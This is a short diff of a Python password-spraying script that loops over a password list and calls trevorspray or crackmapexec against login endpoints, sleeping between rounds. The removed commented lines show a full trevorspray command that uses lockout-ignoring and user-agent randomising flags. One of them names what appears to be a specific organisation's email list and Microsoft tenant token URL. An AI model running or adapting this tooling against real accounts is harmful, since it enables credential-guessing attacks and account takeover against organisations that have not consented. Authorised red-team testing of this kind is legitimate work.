@@ -16,16 +16,13 @@ def spray(url, password_file, emails_file, tool, attempts, delay, proxy):
             if current_line >= total_lines:
                 break
             if tool == "trevorspray" :
-                #os.system("trevorspray -u " + emails_file + " -p \"" + password_list[current_line].strip() + "\" -j 5 -f -ld 5 --delay 5 --proxy " + proxy + " --ignore-lockouts --random-useragent --url " + url)
                 trevorspray.trevorspray(emails_file, password, proxy, url)
             elif tool == "crackmapexec":
                 crackmapexec.cme(emails_file, password, url)
             else:
                 print("Tool not found...")
                 exit()
-            #print("trevorspray -u kepco_valid_emails.txt -p \"" + password_list[current_line].strip() + "\" -j 5 -f -ld 5 --delay 5 --proxy http://127.0.0.1:8080 --ignore-lockouts --random-useragent --url https://login.windows.net/c02ed72e-bd0b-401b-9668-e146144b8a0c/oauth2/token")
             current_line += 1
-        
         if current_line < total_lines:
             print("Sleeping for " + str(delay) + " seconds...")
             time.sleep(delay)  # Sleep for 10 minutes (600 seconds)
